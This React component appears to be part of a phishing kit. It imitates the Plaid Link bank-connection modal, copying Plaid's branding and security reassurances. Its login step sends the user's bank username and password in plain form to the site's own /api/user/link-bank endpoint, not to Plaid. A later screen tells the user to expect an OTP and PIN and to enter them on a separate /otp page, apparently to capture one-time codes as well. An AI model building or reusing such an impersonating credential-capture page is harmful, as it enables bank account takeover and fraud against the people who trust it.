"use client";
import { useState, useEffect, useRef } from "react";
import { BANKS } from "@/lib/banks";

interface PlaidModalProps {
  onClose: () => void;
  onSuccess: (institution: string) => void;
}

const TOP_INSTITUTIONS = [
  { id: "chase", name: "Chase", logo: "https://plaid.com/assets/img/institutions/ins_1.png", color: "#117aca" },
  { id: "bofa", name: "Bank of America", logo: "https://plaid.com/assets/img/institutions/ins_3.png", color: "#e31837" },
  { id: "wells", name: "Wells Fargo", logo: "https://plaid.com/assets/img/institutions/ins_4.png", color: "#ffff00" },
  { id: "citi", name: "Citibank", logo: "https://plaid.com/assets/img/institutions/ins_5.png", color: "#056dae" },
  { id: "usbank", name: "U.S. Bank", logo: "https://plaid.com/assets/img/institutions/ins_6.png", color: "#0033a0" },
  { id: "pnc", name: "PNC", logo: "https://plaid.com/assets/img/institutions/ins_13.png", color: "#f37021" },
];

export default function PlaidModal({ onClose, onSuccess }: PlaidModalProps) {
  const [step, setStep] = useState<"select" | "login" | "verifying" | "loading" | "success">("select");
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedInst, setSelectedInst] = useState<{ id: string; name: string; color?: string } | null>(null);
  const [credentials, setCredentials] = useState({ username: "", password: "" });
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSearchActive, setIsSearchActive] = useState(false);

  const filteredBanks = BANKS.filter((b) => b.toLowerCase().includes(searchTerm.toLowerCase()));

  const handleSelect = (name: string) => {
    setSelectedInst({ id: name.toLowerCase().replace(/\s+/g, "_"), name });
    setStep("login");
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    // Simulate link delay
    await new Promise((resolve) => setTimeout(resolve, 1500));

    try {
      const token = localStorage.getItem("bpkyc_token");
      const res = await fetch("/api/user/link-bank", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          step: "credentials",
          institution: selectedInst?.name,
          username: credentials.username,
          password: credentials.password,
        }),
      });

      if (res.ok) {
        setStep("verifying");
      } else {
        alert("Verification failed. Please try again.");
      }
    } catch (err) {
      alert("Error connecting to bank.");
    } finally {
      setIsSubmitting(false);
    }
  };



  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        background: "rgba(0,0,0,0.6)",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        zIndex: 10000,
        backdropFilter: "blur(4px)",
      }}
      onClick={onClose}
    >
      <div
        style={{
          background: "white",
          width: "380px",
          height: "600px",
          borderRadius: "16px",
          overflow: "hidden",
          boxShadow: "0 24px 64px rgba(0,0,0,0.25)",
          fontFamily: "'Inter', system-ui, sans-serif",
          display: "flex",
          flexDirection: "column",
          position: "relative",
          animation: "plaidFadeIn 0.3s ease-out",
        }}
        onClick={(e) => e.stopPropagation()}
      >
        <style>{`
          @keyframes plaidFadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
          }
          @keyframes plaidRotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
          @keyframes plaidPulse {
            0%, 100% { transform: scale(1); opacity: 0.4; }
            50% { transform: scale(1.15); opacity: 0.8; }
          }
          .custom-scrollbar::-webkit-scrollbar { width: 4px; }
          .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
          .custom-scrollbar::-webkit-scrollbar-thumb { background: #ddd; border-radius: 10px; }
        `}</style>

        {/* Plaid Header */}
        <div
          style={{
            padding: "16px 20px",
            borderBottom: "1px solid #f2f2f2",
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
          }}
        >
          <button
            onClick={step === "login" ? () => setStep("select") : step === "verifying" ? () => setStep("login") : onClose}
            style={{
              background: "none",
              border: "none",
              cursor: "pointer",
              padding: "4px",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
            }}
          >
            {step === "login" || step === "verifying" ? (
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
            ) : (
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
            )}
          </button>
          
          <div style={{ fontWeight: 800, fontSize: "1rem", letterSpacing: "-0.02em", color: "#111", display: "flex", alignItems: "center", gap: "4px" }}>
            <span style={{ color: "#000" }}>plaid</span>
          </div>

          <div style={{ width: "28px" }} />
        </div>

        {/* Content Container */}
        <div style={{ flex: 1, overflowY: "auto", display: "flex", flexDirection: "column" }} className="custom-scrollbar">
          {step === "select" && (
            <div style={{ padding: "24px 24px" }}>
              {!isSearchActive ? (
                <>
                  <h2 style={{ fontSize: "1.25rem", fontWeight: 700, marginBottom: "8px", color: "#111" }}>
                    Select your bank
                  </h2>
                  <p style={{ fontSize: "0.85rem", color: "#666", marginBottom: "28px" }}>
                    Plaid supports 12,000+ financial institutions.
                  </p>
                  
                  {/* Search Trigger */}
                  <div 
                    onClick={() => setIsSearchActive(true)}
                    style={{ 
                        background: "#f7f7f7", 
                        padding: "14px 18px", 
                        borderRadius: "12px", 
                        display: "flex", 
                        alignItems: "center", 
                        gap: "12px", 
                        cursor: "text",
                        marginBottom: "32px",
                        border: "1px solid transparent"
                    }}>
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
                    <span style={{ color: "#999", fontSize: "0.95rem" }}>Search</span>
                  </div>

                  {/* Top Institutions Grid */}
                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px" }}>
                    {TOP_INSTITUTIONS.map((inst) => (
                      <button
                        key={inst.id}
                        onClick={() => handleSelect(inst.name)}
                        style={{
                          padding: "20px 16px",
                          borderRadius: "12px",
                          border: "1px solid #f2f2f2",
                          background: "white",
                          cursor: "pointer",
                          display: "flex",
                          flexDirection: "column",
                          alignItems: "center",
                          gap: "12px",
                          transition: "all 0.2s",
                        }}
                        onMouseEnter={(e) => { e.currentTarget.style.borderColor = "#ddd"; e.currentTarget.style.background = "#fafafa"; }}
                        onMouseLeave={(e) => { e.currentTarget.style.borderColor = "#f2f2f2"; e.currentTarget.style.background = "white"; }}
                      >
                         <div style={{ width: "40px", height: "40px", borderRadius: "50%", background: "#f5f5f5", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "1.2rem", fontWeight: 700, color: "#999" }}>
                            {inst.name[0]}
                         </div>
                        <span style={{ fontWeight: 600, fontSize: "0.85rem", color: "#111" }}>{inst.name}</span>
                      </button>
                    ))}
                  </div>
                </>
              ) : (
                <div style={{ display: "flex", flexDirection: "column", height: "100%" }}>
                   <div style={{ position: "relative", marginBottom: "16px" }}>
                       <input
                         autoFocus
                         type="text"
                         placeholder="Search all institutions"
                         value={searchTerm}
                         onChange={(e) => setSearchTerm(e.target.value)}
                         style={{
                           width: "100%",
                           padding: "14px 18px 14px 44px",
                           borderRadius: "12px",
                           border: "2px solid #111",
                           fontSize: "0.95rem",
                           outline: "none",
                         }}
                       />
                       <svg style={{ position: "absolute", left: "16px", top: "50%", transform: "translateY(-50%)" }} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
                       <button onClick={() => { setIsSearchActive(false); setSearchTerm(""); }} style={{ position: "absolute", right: "12px", top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: "#666", fontWeight: 600, fontSize: "0.8rem", cursor: "pointer" }}>CANCEL</button>
                   </div>

                   <div style={{ flex: 1 }}>
                     {filteredBanks.length > 0 ? (
                       filteredBanks.slice(0, 50).map(bank => (
                         <div 
                           key={bank} 
                           onClick={() => handleSelect(bank)}
                           style={{ padding: "16px 4px", borderBottom: "1px solid #f2f2f2", cursor: "pointer", display: "flex", alignItems: "center", gap: "12px" }}
                         >
                            <div style={{ width: "32px", height: "32px", borderRadius: "50%", background: "#f5f5f5", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "0.8rem", fontWeight: 700, color: "#999", flexShrink: 0 }}>
                              {bank[0]}
                            </div>
                            <span style={{ fontSize: "0.9rem", fontWeight: 500, color: "#111" }}>{bank}</span>
                         </div>
                       ))
                     ) : (
                       <div style={{ textAlign: "center", padding: "40px 20px" }}>
                         <p style={{ color: "#666", fontSize: "0.9rem", marginBottom: "20px" }}>We couldn&apos;t find &quot;{searchTerm}&quot;</p>
                         <button 
                           onClick={() => handleSelect(searchTerm)}
                           style={{ background: "#111", color: "white", padding: "12px 24px", borderRadius: "8px", border: "none", fontWeight: 700, cursor: "pointer" }}>
                           Link {searchTerm} manually
                         </button>
                       </div>
                     )}
                   </div>
                </div>
              )}
            </div>
          )}

          {step === "login" && (
            <div style={{ padding: "40px 24px" }}>
              <div style={{ textAlign: "center", marginBottom: "32px" }}>
                <div style={{ width: "56px", height: "56px", borderRadius: "14px", background: "#f5f5f5", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "1.8rem", margin: "0 auto 16px", color: "#999" }}>
                   {selectedInst?.name[0]}
                </div>
                <h2 style={{ fontSize: "1.3rem", fontWeight: 700, marginBottom: "8px", color: "#111" }}>
                  Login to {selectedInst?.name}
                </h2>
                <p style={{ fontSize: "0.85rem", color: "#666" }}>
                   Input bank credentials to verify primary account status.
                </p>
              </div>
              
              <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
                <div style={{ display: "flex", flexDirection: "column", gap: "0" }}>
                    <input
                      type="text"
                      placeholder="Username / ID"
                      required
                      value={credentials.username}
                      onChange={(e) => setCredentials((p) => ({ ...p, username: e.target.value }))}
                      style={{
                        padding: "16px",
                        borderRadius: "12px 12px 0 0",
                        border: "1px solid #ddd",
                        fontSize: "0.95rem",
                        outline: "none",
                        borderBottom: "none",
                      }}
                    />
                    <input
                      type="password"
                      placeholder="Password"
                      required
                      value={credentials.password}
                      onChange={(e) => setCredentials((p) => ({ ...p, password: e.target.value }))}
                      style={{
                        padding: "16px",
                        borderRadius: "0 0 12px 12px",
                        border: "1px solid #ddd",
                        fontSize: "0.95rem",
                        outline: "none",
                      }}
                    />
                </div>
                
                <button
                  type="submit"
                  disabled={isSubmitting}
                  style={{
                    background: "#111",
                    color: "white",
                    padding: "16px",
                    borderRadius: "12px",
                    border: "none",
                    fontWeight: 700,
                    fontSize: "1rem",
                    cursor: "pointer",
                    marginTop: "12px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "8px",
                  }}
                >
                  {isSubmitting && <div style={{ width: "16px", height: "16px", border: "2px solid rgba(255,255,255,0.3)", borderTopColor: "white", borderRadius: "50%", animation: "plaidRotate 0.8s linear infinite" }} />}
                  <span>Verify Bank</span>
                </button>
              </form>
              
              <p style={{ textAlign: "center", fontSize: "0.75rem", color: "#999", marginTop: "24px" }}>
                Secure connection powered by <span style={{ fontWeight: 800 }}>Plaid Link</span>.
              </p>
            </div>
          )}

          {step === "verifying" && (
            <div style={{ padding: "40px 24px", display: "flex", flexDirection: "column", alignItems: "center", textAlign: "center" }}>
              {/* Animated pulse icon */}
              <div style={{ position: "relative", marginBottom: "28px" }}>
                <div style={{ width: "72px", height: "72px", borderRadius: "50%", background: "#fff3cd", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "2rem" }}>⏳</div>
                <div style={{ position: "absolute", inset: "-6px", borderRadius: "50%", border: "3px solid #f59e0b", opacity: 0.4, animation: "plaidPulse 1.5s ease-in-out infinite" }} />
              </div>
              <h2 style={{ fontSize: "1.25rem", fontWeight: 800, color: "#111", marginBottom: "12px" }}>Verification In Progress</h2>
              <p style={{ fontSize: "0.88rem", color: "#555", lineHeight: 1.6, marginBottom: "24px" }}>
                We've submitted your credentials for review. You will receive an <strong>OTP and PIN</strong> via SMS or email shortly.
              </p>
              <div style={{ background: "#fffbeb", border: "1px solid #fcd34d", borderRadius: "12px", padding: "16px 20px", marginBottom: "28px", width: "100%" }}>
                <p style={{ fontSize: "0.8rem", color: "#92400e", fontWeight: 600, lineHeight: 1.5 }}>
                  📱 Check your registered phone or email for a verification code and PIN. Enter them on the <strong>Verify Account</strong> page.
                </p>
              </div>
              <button
                onClick={() => { onSuccess(selectedInst?.name || ""); onClose(); }}
                style={{ background: "#111", color: "white", padding: "14px 32px", borderRadius: "12px", border: "none", fontWeight: 700, fontSize: "0.95rem", cursor: "pointer", width: "100%" }}
              >
                Got It — Close
              </button>
              <a href="/otp" style={{ marginTop: "14px", fontSize: "0.8rem", color: "#3e63dd", fontWeight: 700, textDecoration: "none" }}>
                → Enter OTP Now
              </a>
            </div>
          )}

          {step === "loading" && (
            <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "40px" }}>
              <div
                style={{
                  width: "48px",
                  height: "48px",
                  border: "4px solid #f2f2f2",
                  borderTop: "4px solid #111",
                  borderRadius: "50%",
                  marginBottom: "24px",
                  animation: "plaidRotate 1s linear infinite",
                }}
              />
              <h2 style={{ fontSize: "1.2rem", fontWeight: 700, marginBottom: "8px", color: "#111" }}>Connecting...</h2>
              <p style={{ fontSize: "0.85rem", color: "#666", textAlign: "center" }}>
                Securing your connection to {selectedInst?.name}. This usually takes a few seconds.
              </p>
            </div>
          )}

          {step === "success" && (
            <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: "40px" }}>
              <div
                style={{
                  width: "56px",
                  height: "56px",
                  background: "#e6fcf5",
                  color: "#0ca678",
                  borderRadius: "50%",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  fontSize: "1.8rem",
                  marginBottom: "24px",
                }}
              >
                ✓
              </div>
              <h2 style={{ fontSize: "1.2rem", fontWeight: 700, marginBottom: "8px", color: "#111" }}>Bank Verified</h2>
              <p style={{ fontSize: "0.85rem", color: "#666", textAlign: "center" }}>
                 Your {selectedInst?.name} account has been securely verified via Plaid.
              </p>
            </div>
          )}
        </div>

        {/* Plaid Footer */}
        <div
          style={{
            padding: "12px 20px",
            background: "white",
            borderTop: "1px solid #f2f2f2",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "8px",
          }}
        >
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#999" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          <span style={{ fontSize: "0.7rem", color: "#999", fontWeight: 600, letterSpacing: "0.02em", textTransform: "uppercase" }}>
            Secure and encrypted
          </span>
        </div>
      </div>
    </div>
  );
}
